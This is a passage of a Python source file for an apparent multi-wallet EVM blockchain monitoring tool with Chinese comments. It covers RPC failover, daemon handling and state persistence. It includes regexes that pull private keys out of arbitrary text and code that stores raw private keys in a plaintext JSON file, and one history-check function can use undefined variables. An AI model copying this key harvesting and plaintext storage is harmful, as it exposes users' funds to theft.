                base_tips.insert(0, "🎯 准备就绪：所有设置完成，可以开始监控了")
        
        return base_tips[:3]  # 最多显示3个提示
    
    def enhanced_input(self, prompt: str, default: str = "", choices: list = None, menu_name: str = "", 
                      timeout: int = None, validation_func=None, error_message: str = None, allow_empty: bool = False) -> str:
        """增强的输入函数（性能优化版本）"""
        
        # 性能优化：缓存智能默认值
        cache_key = f"smart_default_{menu_name}_{len(choices) if choices else 0}"
        
        # 获取智能默认值
        if choices and menu_name and self.user_preferences.get('smart_defaults', True):
            cached_default = self.smart_cache.get(cache_key, 'session')
            if cached_default:
                smart_default = cached_default
            else:
                smart_default = self.get_smart_default(menu_name, [str(i) for i in range(len(choices))])
                self.smart_cache.set(cache_key, smart_default, 'session', 'smart_defaults')
            
            if smart_default and not default:
                default = smart_default
        
        # 构建提示
        full_prompt = prompt
        if default:
            full_prompt += f" {Fore.YELLOW}[默认: {default}]{Style.RESET_ALL}"
        
        # 显示选择历史（如果启用了快速导航）
        if choices and menu_name and self.user_preferences.get('quick_navigation', True):
            recent = [h['choice'] for h in self.choice_history[menu_name][-3:]]
            if recent:
                unique_recent = list(dict.fromkeys(recent))  # 去重保持顺序
                full_prompt += f" {Fore.CYAN}[最近: {','.join(unique_recent)}]{Style.RESET_ALL}"
        
        # 获取用户输入（带超时和错误处理）
        max_retries = 3
        retry_count = 0
        
        while retry_count < max_retries:
            try:
                user_input = self.safe_input(full_prompt).strip()
                result = user_input if user_input else default
                
                # 验证输入
                validation_passed = True
                error_msg = None
                
                # 空值检查
                if not allow_empty and not result:
                    validation_passed = False
                    error_msg = "输入不能为空"
                
                # 选择验证
                elif choices and result not in choices and result != default:
                    validation_passed = False
                    error_msg = f"无效选择，请从 {choices} 中选择"
                
                # 自定义验证函数
                elif validation_func and result:
                    try:
                        if not validation_func(result):
                            validation_passed = False
                            error_msg = error_message or "输入验证失败"
                    except Exception as e:
                        validation_passed = False
                        error_msg = f"验证出错: {str(e)}"
                
                if not validation_passed:
                    print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
                    retry_count += 1
                    if retry_count < max_retries:
                        print(f"{Fore.CYAN}💡 还有 {max_retries - retry_count} 次重试机会{Style.RESET_ALL}")
                        continue
                    else:
                        if default:
                            print(f"{Fore.YELLOW}使用默认值: {default}{Style.RESET_ALL}")
                            result = default
                        else:
                            print(f"{Fore.RED}❌ 多次输入无效，操作取消{Style.RESET_ALL}")
                            return ""
                
                # 记录选择
                if menu_name and result:
                    self.record_user_choice(menu_name, result)
                
                return result
                
            except (EOFError, KeyboardInterrupt):
                return default
            except Exception as e:
                print(f"{Fore.RED}❌ 输入错误: {e}{Style.RESET_ALL}")
                retry_count += 1
                if retry_count >= max_retries:
                    print(f"{Fore.YELLOW}使用默认值: {default}{Style.RESET_ALL}")
                    return default
        
        return default
    
    def cleanup_memory(self):
        """清理内存和缓存"""
        try:
            import gc
            
            # 清理智能缓存
            if hasattr(self, 'smart_cache'):
                self.smart_cache._cleanup_expired()
            
            # 清理过期的RPC测试缓存
            current_time = time.time()
            cache_ttl = 1800  # 30分钟
            
            for network_key in list(self.rpc_test_cache.keys()):
                cache_data = self.rpc_test_cache[network_key]
                if current_time - cache_data.get('last_test', 0) > cache_ttl:
                    del self.rpc_test_cache[network_key]
            
            # 清理过期的代币元数据缓存
            token_cache_ttl = 7200  # 2小时
            for cache_key in list(self.token_metadata_cache.keys()):
                # 简单的TTL实现，如果缓存太大就清理一半
                if len(self.token_metadata_cache) > 1000:
                    # 清理一半最旧的缓存
                    keys_to_remove = list(self.token_metadata_cache.keys())[:500]
                    for key in keys_to_remove:
                        del self.token_metadata_cache[key]
                    break
            
            # 清理活跃代币追踪器中的过期数据
            active_token_ttl = 86400  # 24小时
            for address in list(self.active_tokens.keys()):
                address_data = self.active_tokens[address]
                for network in list(address_data.keys()):
                    network_data = address_data[network]
                    for token in list(network_data.keys()):
                        if current_time - network_data[token] > active_token_ttl:
                            del network_data[token]
                    
                    # 如果某个网络下没有活跃代币了，删除网络条目
                    if not network_data:
                        del address_data[network]
                
                # 如果某个地址下没有任何活跃代币了，删除地址条目
                if not address_data:
                    del self.active_tokens[address]
            
            # 清理过期的被拉黑RPC（超过24小时自动解封）
            blocked_rpc_ttl = 86400  # 24小时
            rpcs_to_unblock = []
            for rpc_url, rpc_info in self.blocked_rpcs.items():
                if current_time - rpc_info.get('blocked_time', 0) > blocked_rpc_ttl:
                    rpcs_to_unblock.append(rpc_url)
            
            for rpc_url in rpcs_to_unblock:
                del self.blocked_rpcs[rpc_url]
                self.logger.info(f"自动解封过期RPC: {rpc_url}")
            
            if rpcs_to_unblock:
                print(f"{Fore.GREEN}🔄 自动解封 {len(rpcs_to_unblock)} 个过期的被拉黑RPC{Style.RESET_ALL}")
            
            # 强制垃圾回收
            collected = gc.collect()
            
            self.last_memory_cleanup = current_time
            self.logger.info(f"内存清理完成，回收了 {collected} 个对象")
            
            # 重置错误计数
            self.error_count = 0
            
        except Exception as e:
            self.logger.error(f"内存清理失败: {e}")
    
    def handle_error(self, error: Exception, context: str = "", critical: bool = False):
        """增强的统一错误处理器"""
        self.error_count += 1
        error_msg = f"错误[{self.error_count}] in {context}: {str(error)}"
        
        self.logger.error(error_msg)
        
        # 错误分类和处理
        if isinstance(error, (ConnectionError, TimeoutError)):
            # 网络相关错误
            print(f"{Fore.YELLOW}🌐 网络连接问题: {error}{Style.RESET_ALL}")
            self._handle_network_error(context)
        elif isinstance(error, (ValueError, TypeError)):
            # 数据类型错误
            print(f"{Fore.RED}📊 数据错误: {error}{Style.RESET_ALL}")
            self._handle_data_error(context)
        elif isinstance(error, FileNotFoundError):
            # 文件问题
            print(f"{Fore.YELLOW}📁 文件问题: {error}{Style.RESET_ALL}")
            self._handle_file_error(context)
        elif critical:
            # 关键错误，立即处理
            print(f"{Fore.RED}🚨 严重错误: {error}{Style.RESET_ALL}")
            self._handle_critical_error(context)
        
        # 如果错误过多，触发清理
        if self.error_count > self.max_errors:
            print(f"{Fore.YELLOW}⚠️ 错误过多，正在清理内存...{Style.RESET_ALL}")
            self.cleanup_memory()
            self.error_count = 0  # 重置错误计数
        
        # 关键错误可能需要重启
        if self.error_count > self.max_errors // 2:
            print(f"{Fore.RED}⚠️ 系统不稳定，建议重启{Style.RESET_ALL}")
            self.request_restart("频繁错误")
    
    def _handle_network_error(self, context: str):
        """处理网络相关错误"""
        # 清理网络缓存
        if hasattr(self, 'cache'):
            self.cache.clear_category('rpc_status')
            self.cache.clear_category('network_info')
        
        # 重置连接状态
        with self._connection_lock:
            for network_key in list(self.connection_status.keys()):
                if not self.is_network_connected(network_key):
                    self.connection_status.pop(network_key, None)
    
    def _handle_data_error(self, context: str):
        """处理数据相关错误"""
        # 确保数据结构完整性
        self._ensure_data_structures()
        
        # 清理可能损坏的缓存
        if hasattr(self, 'cache'):
            self.cache.invalidate()
    
    def _handle_file_error(self, context: str):
        """处理文件相关错误"""
        # 检查关键文件
        if not os.path.exists(self.wallet_file):
            print(f"{Fore.YELLOW}💡 创建空白钱包文件{Style.RESET_ALL}")
            try:
                self.save_wallets()
            except Exception as e:
                self.logger.error(f"创建钱包文件失败: {e}")
        
        if not os.path.exists(self.state_file):
            print(f"{Fore.YELLOW}💡 创建空白状态文件{Style.RESET_ALL}")
            try:
                self.save_state()
            except Exception as e:
                self.logger.error(f"创建状态文件失败: {e}")
    
    def _handle_critical_error(self, context: str):
        """处理严重错误"""
        print(f"{Fore.RED}🚨 正在执行紧急恢复程序...{Style.RESET_ALL}")
        
        # 保存当前状态
        try:
            self.save_state()
            self.save_wallets()
            print(f"{Fore.GREEN}✅ 紧急保存完成{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}❌ 紧急保存失败: {e}{Style.RESET_ALL}")
        
        # 建议用户操作
        print(f"{Fore.CYAN}💡 建议操作：{Style.RESET_ALL}")
        print(f"  1. 重启程序")
        print(f"  2. 检查网络连接")
        print(f"  3. 清理缓存文件")
    
    def request_restart(self, reason: str):
        """请求重启程序"""
        current_time = time.time()
        
        # 检查重启间隔
        if current_time - self.last_restart_time < self.restart_interval:
            self.logger.warning(f"重启请求被拒绝，间隔太短: {reason}")
            return False
        
        # 检查重启次数
        if self.restart_count >= self.max_restarts:
            self.logger.error(f"达到最大重启次数({self.max_restarts})，程序退出: {reason}")
            print(f"{Fore.RED}❌ 程序重启次数过多，自动退出{Style.RESET_ALL}")
            return False
        
        self.restart_count += 1
        self.last_restart_time = current_time
        
        self.logger.info(f"程序重启请求[{self.restart_count}/{self.max_restarts}]: {reason}")
        print(f"{Fore.YELLOW}🔄 程序将重启({self.restart_count}/{self.max_restarts}): {reason}{Style.RESET_ALL}")
        
        # 保存状态
        try:
            self.save_state()
            self.save_wallets()
        except Exception as e:
            self.logger.error(f"重启前保存状态失败: {e}")
        
        return True
    
    def start_daemon_mode(self):
        """启动守护进程模式"""
        self.daemon_mode = True
        print(f"{Fore.CYAN}🛡️ 启动守护进程模式{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 守护进程特性：{Style.RESET_ALL}")
        print(f"   • 自动错误恢复和重启机制")
        print(f"   • 定期内存清理({self.memory_cleanup_interval//60}分钟)")
        print(f"   • 最大重启次数: {self.max_restarts}")
        print(f"   • 错误阈值: {self.max_errors}")
        
        # 初始化守护进程相关状态
        self.error_count = 0
        self.restart_count = 0
        self.last_restart_time = time.time()
        self.last_memory_cleanup = time.time()
        
        # 执行一次初始内存清理
        self.cleanup_memory()
        
        # 启动监控
        return self.start_monitoring()
    
    def create_daemon_wrapper(self):
        """创建守护进程包装器脚本"""
        wrapper_script = """#!/bin/bash
# EVM监控守护进程包装器

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

LOG_FILE="daemon.log"
PID_FILE="daemon.pid"

# 颜色定义
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
NC='\\033[0m'

case "$1" in
    start)
        if [ -f "$PID_FILE" ]; then
            PID=$(cat "$PID_FILE")
            if ps -p $PID > /dev/null 2>&1; then
                echo -e "${YELLOW}守护进程已在运行 (PID: $PID)${NC}"
                exit 1
            else
                rm -f "$PID_FILE"
            fi
        fi
        
        echo -e "${GREEN}启动EVM监控守护进程...${NC}"
        nohup python3 evm_monitor.py --daemon > "$LOG_FILE" 2>&1 &
        echo $! > "$PID_FILE"
        echo -e "${GREEN}守护进程已启动 (PID: $!)${NC}"
        echo -e "${YELLOW}日志文件: $LOG_FILE${NC}"
        ;;
    stop)
        if [ -f "$PID_FILE" ]; then
            PID=$(cat "$PID_FILE")
            if ps -p $PID > /dev/null 2>&1; then
                echo -e "${YELLOW}停止守护进程 (PID: $PID)...${NC}"
                kill $PID
                rm -f "$PID_FILE"
                echo -e "${GREEN}守护进程已停止${NC}"
            else
                echo -e "${RED}守护进程未运行${NC}"
                rm -f "$PID_FILE"
            fi
        else
            echo -e "${RED}守护进程未运行${NC}"
        fi
        ;;
    restart)
        $0 stop
        sleep 2
        $0 start
        ;;
    status)
        if [ -f "$PID_FILE" ]; then
            PID=$(cat "$PID_FILE")
            if ps -p $PID > /dev/null 2>&1; then
                echo -e "${GREEN}守护进程正在运行 (PID: $PID)${NC}"
                echo -e "${YELLOW}日志文件: $LOG_FILE${NC}"
                echo -e "${YELLOW}最后10行日志:${NC}"
                tail -10 "$LOG_FILE" 2>/dev/null || echo "无法读取日志文件"
            else
                echo -e "${RED}守护进程未运行${NC}"
                rm -f "$PID_FILE"
            fi
        else
            echo -e "${RED}守护进程未运行${NC}"
        fi
        ;;
    log)
        if [ -f "$LOG_FILE" ]; then
            tail -f "$LOG_FILE"
        else
            echo -e "${RED}日志文件不存在${NC}"
        fi
        ;;
    *)
        echo "用法: $0 {start|stop|restart|status|log}"
        echo "  start   - 启动守护进程"
        echo "  stop    - 停止守护进程"
        echo "  restart - 重启守护进程"
        echo "  status  - 查看守护进程状态"
        echo "  log     - 查看实时日志"
        exit 1
        ;;
esac
"""
        
        try:
            with open("daemon.sh", "w", encoding="utf-8") as f:
                f.write(wrapper_script)
            
            import os
            os.chmod("daemon.sh", 0o755)
            
            print(f"{Fore.GREEN}✅ 守护进程包装器已创建: daemon.sh{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}使用方法：{Style.RESET_ALL}")
            print(f"  ./daemon.sh start   - 启动守护进程")
            print(f"  ./daemon.sh stop    - 停止守护进程")
            print(f"  ./daemon.sh status  - 查看状态")
            print(f"  ./daemon.sh log     - 查看日志")
            
        except Exception as e:
            print(f"{Fore.RED}❌ 创建守护进程包装器失败: {e}{Style.RESET_ALL}")

    def safe_input(self, prompt: str = "") -> str:
        """安全的输入函数，处理EOF错误"""
        try:
            # 检查是否强制交互模式
            force_interactive = getattr(self, '_force_interactive', False)
            
            # 检查交互式环境
            import sys
            import os
            
            # 更严格的交互式检测，但如果强制交互模式则跳过检测
            is_interactive = (
                force_interactive or (
                    sys.stdin.isatty() and 
                    sys.stdout.isatty() and 
                    os.isatty(0) and 
                    os.isatty(1)
                )
            )
            
            if not is_interactive:
                # 非交互式环境，返回默认值
                if "选项" in prompt or "选择" in prompt:
                    print(f"{Fore.YELLOW}⚠️  非交互式环境，自动退出{Style.RESET_ALL}")
                    return "0"
                else:
                    print(f"{Fore.YELLOW}⚠️  非交互式环境，使用空值{Style.RESET_ALL}")
                    return ""
            
            # 交互式环境或强制交互模式，正常读取输入
            try:
                # 刷新输出缓冲区确保提示显示
                sys.stdout.flush()
                sys.stderr.flush()
                
                # 如果是强制交互模式，提供额外的提示
                if force_interactive and not sys.stdin.isatty():
                    print(f"{Fore.CYAN}💡 强制交互模式：请输入您的选择{Style.RESET_ALL}")
                
                user_input = input(prompt)
                return user_input
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}👋 用户中断{Style.RESET_ALL}")
                return "0"
                
        except EOFError:
            print(f"\n{Fore.YELLOW}⚠️  EOF错误，程序无法读取输入{Style.RESET_ALL}")
            print(f"{Fore.CYAN}💡 这通常发生在通过管道运行程序时{Style.RESET_ALL}")
            print(f"{Fore.CYAN}💡 建议：在新的终端窗口中运行程序{Style.RESET_ALL}")
            print(f"{Fore.GREEN}   cd ~/evm_monitor && python3 evm_monitor.py{Style.RESET_ALL}")
            if "选项" in prompt or "选择" in prompt:
                return "0"  # 退出菜单
            return ""
        except Exception as e:
            print(f"\n{Fore.RED}❌ 输入错误: {e}{Style.RESET_ALL}")
            if "选项" in prompt or "选择" in prompt:
                return "0"  # 退出菜单
            return ""

    def init_web3_connections(self):
        """初始化Web3连接，支持多RPC端点故障转移"""
        print(f"{Fore.CYAN}🔗 正在连接区块链网络...{Style.RESET_ALL}")
        successful_connections = 0
        
        for network_key, network_info in self.networks.items():
            connected = False
            
            # 尝试连接多个RPC端点
            for i, rpc_url in enumerate(network_info['rpc_urls']):
                # 跳过被屏蔽的RPC
                if rpc_url in self.blocked_rpcs:
                    continue
                    
                try:
                    w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': 10}))
                    
                    # 测试连接并获取链ID验证
                    if w3.is_connected():
                        try:
                            # 跳过特殊链ID（如非EVM链）
                            if network_info['chain_id'] == 0:
                                print(f"{Fore.YELLOW}⚠️ {network_info['name']} 暂不支持 (非标准EVM链){Style.RESET_ALL}")
                                continue
                                
                            chain_id = w3.eth.chain_id
                            if chain_id == network_info['chain_id']:
                                self.web3_connections[network_key] = w3
                                currency = network_info['native_currency']
                                print(f"{Fore.GREEN}✅ {network_info['name']} ({currency}) 连接成功 [RPC-{i+1}]{Style.RESET_ALL}")
                                connected = True
                                successful_connections += 1
                                break
                            else:
                                print(f"{Fore.YELLOW}⚠️ {network_info['name']} 链ID不匹配 (期望: {network_info['chain_id']}, 实际: {chain_id}){Style.RESET_ALL}")
                        except Exception as e:
                            print(f"{Fore.YELLOW}⚠️ {network_info['name']} 链ID验证失败: {e}{Style.RESET_ALL}")
                            continue
                    else:
                        continue
                        
                except Exception as e:
                    if i == len(network_info['rpc_urls']) - 1:  # 最后一个RPC也失败了
                        print(f"{Fore.RED}❌ {network_info['name']} 所有RPC连接失败{Style.RESET_ALL}")
                    continue
            
            if not connected:
                print(f"{Fore.RED}❌ {network_info['name']} 无法连接{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}🌐 网络连接总结: {successful_connections}/{len(self.networks)} 个网络连接成功{Style.RESET_ALL}")
        
        if successful_connections == 0:
            print(f"{Fore.RED}❌ 没有可用的网络连接，请检查网络设置{Style.RESET_ALL}")
        
        return successful_connections > 0



    def extract_private_keys_from_text(self, text: str) -> list:
        """智能从文本中提取私钥（支持乱码和混合数据）"""
        import re
        
        # 清理文本，去除常见的分隔符和无关字符
        text = text.replace('\n', ' ').replace('\r', ' ').replace('\t', ' ')
        
        # 定义私钥的正则表达式模式
        patterns = [
            # 标准私钥格式：0x + 64位十六进制
            r'0x[a-fA-F0-9]{64}',
            # 纯64位十六进制（无0x前缀）
            r'(?<![a-fA-F0-9])[a-fA-F0-9]{64}(?![a-fA-F0-9])',
            # 处理可能的分隔符情况
            r'[a-fA-F0-9]{8}[^a-fA-F0-9]*[a-fA-F0-9]{8}[^a-fA-F0-9]*[a-fA-F0-9]{8}[^a-fA-F0-9]*[a-fA-F0-9]{8}[^a-fA-F0-9]*[a-fA-F0-9]{8}[^a-fA-F0-9]*[a-fA-F0-9]{8}[^a-fA-F0-9]*[a-fA-F0-9]{8}[^a-fA-F0-9]*[a-fA-F0-9]{8}',
        ]
        
        extracted_keys = []
        
        for pattern in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                # 清理匹配的字符串，移除非十六进制字符
                cleaned_key = re.sub(r'[^a-fA-F0-9]', '', match)
                
                # 确保是64位十六进制
                if len(cleaned_key) == 64 and all(c in '0123456789abcdefABCDEF' for c in cleaned_key):
                    # 确保不是全0或全F（无效私钥）
                    if not all(c == '0' for c in cleaned_key) and not all(c.lower() == 'f' for c in cleaned_key):
                        if not cleaned_key.startswith('0x'):
                            cleaned_key = '0x' + cleaned_key
                        
                        # 验证私钥是否有效
                        try:
                            Account.from_key(cleaned_key)
                            if cleaned_key not in extracted_keys:
                                extracted_keys.append(cleaned_key)
                        except:
                            continue
        
        # 处理特殊格式：地址----私钥
        address_key_pattern = r'0x[a-fA-F0-9]{40}[^a-fA-F0-9]+([a-fA-F0-9]{64})'
        address_key_matches = re.findall(address_key_pattern, text, re.IGNORECASE)
        
        for match in address_key_matches:
            cleaned_key = '0x' + match
            try:
                Account.from_key(cleaned_key)
                if cleaned_key not in extracted_keys:
                    extracted_keys.append(cleaned_key)
            except:
                continue
        
        return extracted_keys

    def add_private_key(self, private_key: str) -> str:
        """添加私钥并返回状态（自动去重）"""
        try:
            if not private_key.startswith('0x'):
                private_key = '0x' + private_key
            
            account = Account.from_key(private_key)
            address = account.address
            
            # 检查是否已存在（去重）
            if address in self.wallets:
                print(f"{Fore.YELLOW}⚠️ 钱包地址已存在: {address}{Style.RESET_ALL}")
                return "duplicate"
            
            self.wallets[address] = private_key
            print(f"{Fore.GREEN}✅ 成功添加钱包地址: {address}{Style.RESET_ALL}")
            self.logger.info(f"添加钱包地址: {address}")
            
            # 自动保存钱包
            self.save_wallets()
            
            return "success"
        except Exception as e:
            print(f"{Fore.RED}❌ 添加私钥失败: {e}{Style.RESET_ALL}")
            return "invalid"

    def save_wallets(self) -> bool:
        """保存钱包到JSON文件 - 线程安全版本"""
        with self._wallet_lock:
            try:
                data = {
                    'wallets': self.wallets,
                    'target_wallet': self.target_wallet
                }
                
                with open(self.wallet_file, 'w') as f:
                    json.dump(data, f, indent=2)
                
                self.logger.info(f"钱包已保存: {len(self.wallets)} 个地址")
                return True
            except Exception as e:
                print(f"{Fore.RED}❌ 保存钱包失败: {e}{Style.RESET_ALL}")
                return False

    def load_wallets(self) -> bool:
        """从JSON文件加载钱包 - 线程安全版本"""
        with self._wallet_lock:
            try:
                if not os.path.exists(self.wallet_file):
                    print(f"{Fore.YELLOW}⚠️ 钱包文件不存在，将创建新的钱包{Style.RESET_ALL}")
                    return True
                
                with open(self.wallet_file, 'r') as f:
                    data = json.load(f)
                
                self.wallets = data.get('wallets', {})
                self.target_wallet = data.get('target_wallet', '')
                
                print(f"{Fore.GREEN}✅ 成功加载 {len(self.wallets)} 个钱包{Style.RESET_ALL}")
                return True
            except Exception as e:
                print(f"{Fore.RED}❌ 加载钱包失败: {e}{Style.RESET_ALL}")
                return False

    def save_state(self):
        """保存监控状态 - 线程安全版本"""
        with self._data_lock:
            try:
                # 准备连接状态数据（排除不可序列化的web3实例）
                serializable_connections = {}
                for network_key, conn_info in self.connections.items():
                    serializable_connections[network_key] = {
                        'rpc_url': conn_info.get('rpc_url'),
                        'status': conn_info.get('status'),
                        'last_test': conn_info.get('last_test')
                    }
                
                state = {
                    'monitored_addresses': self.monitored_addresses,
                    'blocked_networks': self.blocked_networks,
                    'transfer_stats': self.transfer_stats,
                    'rpc_latency_history': self.rpc_latency_history,
                    'blocked_rpcs': self.blocked_rpcs,
                    'token_metadata_cache': self.token_metadata_cache,
                    'active_tokens': self.active_tokens,
                    'user_added_tokens': list(self.user_added_tokens),
                    'address_full_scan_done': self.address_full_scan_done,
                    'last_full_scan_time': self.last_full_scan_time,
                    'rpc_stats': self.rpc_stats,
                    'rpc_test_cache': self.rpc_test_cache,
                    'connection_status': self.connection_status,
                    'active_rpcs': self.active_rpcs,
                    'serializable_connections': serializable_connections,
                    'networks': self.networks,  # 保存网络配置变更
                    'last_save': datetime.now().isoformat()
                }
                with open(self.state_file, 'w') as f:
                    json.dump(state, f, indent=2)
                
                # 检查是否需要备份
                self._maybe_backup_state()
            except Exception as e:
                self.logger.error(f"保存状态失败: {e}")

    def _maybe_backup_state(self):
        """如果需要则创建状态文件备份"""
        try:
            now_ts = time.time()
            if now_ts - self.last_backup_time > self.backup_interval_hours * 3600:
                backup_name = f"{self.state_file}.{datetime.now().strftime('%Y%m%d-%H%M%S')}"
                import shutil
                if os.path.exists(self.state_file):
                    shutil.copy2(self.state_file, backup_name)
                    self.last_backup_time = now_ts
                    # 清理旧备份
                    self._cleanup_old_backups()
        except Exception as e:
            self.logger.warning(f"备份状态失败: {e}")

    def _cleanup_old_backups(self):
        """清理过多的备份文件"""
        try:
            import glob
            pattern = f"{self.state_file}.*"
            backups = sorted(glob.glob(pattern), reverse=True)
            for old_backup in backups[self.backup_max_files:]:
                try:
                    os.remove(old_backup)
                except Exception:
                    pass
        except Exception:
            pass

    def load_state(self):
        """加载监控状态 - 线程安全版本"""
        with self._data_lock:
            try:
                if os.path.exists(self.state_file):
                    with open(self.state_file, 'r') as f:
                        state = json.load(f)
                    self.monitored_addresses = state.get('monitored_addresses', {})
                    self.blocked_networks = state.get('blocked_networks', {})
                    
                    # 加载转账统计，保持兼容性
                    saved_stats = state.get('transfer_stats', {})
                    if saved_stats:
                        self.transfer_stats.update(saved_stats)
                    
                    # 加载RPC延迟历史和屏蔽数据
                    self.rpc_latency_history = state.get('rpc_latency_history', {})
                    self.blocked_rpcs = state.get('blocked_rpcs', {})
                    self.token_metadata_cache = state.get('token_metadata_cache', {})
                    self.active_tokens = state.get('active_tokens', {})
                    self.user_added_tokens = set(state.get('user_added_tokens', []))
                    self.address_full_scan_done = state.get('address_full_scan_done', {})
                    # 兼容性：如果存在旧的full_scan_done，迁移到新格式
                    if 'full_scan_done' in state and state['full_scan_done']:
                        for addr in self.monitored_addresses.keys():
                            self.address_full_scan_done[addr] = True
                    self.last_full_scan_time = state.get('last_full_scan_time', 0.0)
                    self.rpc_stats = state.get('rpc_stats', {})
                    self.rpc_test_cache = state.get('rpc_test_cache', {})
                    
                    # 加载连接状态和网络配置
                    self.connection_status = state.get('connection_status', {})
                    self.active_rpcs = state.get('active_rpcs', {})
                    
                    # 加载网络配置更新（如果有）
                    saved_networks = state.get('networks')
                    if saved_networks:
                        # 合并保存的网络配置，保留用户添加的RPC
                        for network_key, network_config in saved_networks.items():
                            if network_key in self.networks:
                                # 合并RPC列表，保留新增的RPC (统一使用rpc_urls字段)
                                saved_rpcs = network_config.get('rpc_urls', network_config.get('rpcs', []))
                                if saved_rpcs and saved_rpcs != self.networks[network_key].get('rpc_urls', []):
                                    # 更新RPC列表
                                    self.networks[network_key]['rpc_urls'] = saved_rpcs
                                
                                # 更新其他可能被修改的字段
                                if 'chain_id' in network_config:
                                    self.networks[network_key]['chain_id'] = network_config['chain_id']
                    
                    # 恢复连接状态（不包含web3实例）
                    serializable_connections = state.get('serializable_connections', {})
                    for network_key, conn_info in serializable_connections.items():
                        self.connections[network_key] = {
                            'web3': None,  # web3实例需要重新创建
                            'rpc_url': conn_info.get('rpc_url'),
                            'status': conn_info.get('status'),
                            'last_test': conn_info.get('last_test')
                        }
                    
                    self.logger.info(f"恢复监控状态: {len(self.monitored_addresses)} 个地址")
                    self.logger.info(f"恢复屏蔽网络: {sum(len(nets) for nets in self.blocked_networks.values())} 个")
                    if self.blocked_rpcs:
                        self.logger.info(f"恢复屏蔽RPC: {len(self.blocked_rpcs)} 个")
                    self.logger.info(f"恢复转账统计: 成功{self.transfer_stats['successful_transfers']}次 失败{self.transfer_stats['failed_transfers']}次")
                    self.logger.info(f"恢复连接状态: {len(self.connections)} 个网络")
            except Exception as e:
                self.logger.error(f"加载状态失败: {e}")
                # 确保基本数据结构存在
                if not hasattr(self, 'connection_status'):
                    self.connection_status = {}
                if not hasattr(self, 'active_rpcs'):
                    self.active_rpcs = {}
    
    def update_connection_status(self, network_key: str, status: bool, rpc_url: str = None, web3_instance=None):
        """更新网络连接状态 - 线程安全版本"""
        with self._connection_lock:
            self.connection_status[network_key] = status
            
            if status and rpc_url:
                self.active_rpcs[network_key] = rpc_url
                self.connections[network_key] = {
                    'web3': web3_instance,
                    'rpc_url': rpc_url,
                    'status': 'connected',
                    'last_test': time.time()
                }
            elif not status:
                self.connections[network_key] = {
                    'web3': None,
                    'rpc_url': rpc_url,
                    'status': 'failed',
                    'last_test': time.time()
                }
            
            # 更新缓存
            self.cache.invalidate(category='rpc_status')
            self.cache.invalidate(category='network_info')
    
    def get_connection_status(self, network_key: str) -> Dict:
        """获取网络连接状态 - 线程安全版本"""
        with self._connection_lock:
            return {
                'connected': self.connection_status.get(network_key, False),
                'rpc_url': self.active_rpcs.get(network_key),
                'connection_info': self.connections.get(network_key, {})
            }
    
    def is_network_connected(self, network_key: str) -> bool:
        """检查网络是否已连接"""
        return self.connection_status.get(network_key, False)
    
    def get_connected_networks(self) -> List[str]:
        """获取所有已连接的网络列表"""
        with self._connection_lock:
            return [network_key for network_key, status in self.connection_status.items() if status]
    
    def _ensure_data_structures(self):
        """确保所有必要的数据结构都存在，防止AttributeError"""
        # 基本数据结构
        required_attrs = {
            'transfer_stats': defaultdict(int),
            'token_metadata_cache': {},
            'active_tokens': {},
            'user_added_tokens': set(),
            'address_full_scan_done': {},
            'last_full_scan_time': 0.0,
            'rpc_stats': defaultdict(dict),
            'rpc_test_cache': {},
            'rpc_latency_history': {},
            'blocked_rpcs': {},
            'user_preferences': {
                'smart_defaults': True,
                'quick_navigation': True,
                'auto_save': True,
                'detailed_logs': False
            },
            'choice_history': defaultdict(list),
            'operation_timers': {},
            'performance_stats': {
                'operations_count': 0,
                'avg_response_time': 0.0,
                'cache_hit_rate': 0.0
            },
            'backup_max_files': 10,
            'backup_interval_hours': 24,
            'last_backup_time': 0
        }
        
        # 确保所有属性存在
        for attr_name, default_value in required_attrs.items():
            if not hasattr(self, attr_name):
                setattr(self, attr_name, default_value)
        
        # 确保智能缓存系统正常工作
        if not hasattr(self, 'smart_cache'):
            self.smart_cache = self.cache
        
        # 确保连接状态数据结构存在
        if not hasattr(self, 'connection_status'):
            self.connection_status = {}
        if not hasattr(self, 'active_rpcs'):
            self.active_rpcs = {}
        if not hasattr(self, 'connections'):
            self.connections = {}
        
        self.logger.info("数据结构完整性检查完成")

    def check_transaction_history(self, address: str, network: str) -> bool:
        """检查地址在指定网络上是否有交易历史"""
        try:
            if network not in self.web3_connections:
                return False
            
            w3 = self.web3_connections[network]
            
            # 检查交易数量
            tx_count = w3.eth.get_transaction_count(address)
            
            # 如果交易数量大于0，说明有交易历史
            has_history = tx_count > 0
            
            if has_history:
                network_name = self.networks[network]['name']
                if '🧪' in network_name:  # 测试网
                    color = Fore.YELLOW
                elif '🔷' in network_name or '🔵' in network_name:  # 主网
                    color = Fore.BLUE
            else:
                color = Fore.GREEN
                
            print(f"{Fore.GREEN}✅ {address[:10]}... 在 {color}{network_name}{Style.RESET_ALL} 有 {Fore.CYAN}{tx_count}{Style.RESET_ALL} 笔交易")
            # 不显示无交易历史的提示，减少屏幕垃圾
            
            return has_history
        except Exception as e:
            # 不显示连接失败的错误，减少干扰
            return False

    def check_transaction_history_concurrent(self, address: str, network_key: str, timeout: float = 1.0) -> Tuple[str, bool, float, str]:
        """并发检查地址在指定网络上是否有交易历史"""
        start_time = time.time()
        try:
            # 获取网络信息
            network_info = self.networks.get(network_key)
            if not network_info:
                return network_key, False, time.time() - start_time, "网络不存在"
            
            # 获取可用的RPC列表（排除被屏蔽的）
            available_rpcs = [rpc for rpc in network_info['rpc_urls'] if rpc not in self.blocked_rpcs]
            if not available_rpcs:
                return network_key, False, time.time() - start_time, "无可用RPC"
            
            # 选择最多5个RPC进行并发测试
            test_rpcs = available_rpcs[:5]
            
            def test_single_rpc(rpc_url):
                rpc_start = time.time()
                try:
                    w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': timeout}))
                    if w3.is_connected():
                        # 验证链ID
                        chain_id = w3.eth.chain_id
                        if chain_id == network_info['chain_id']:
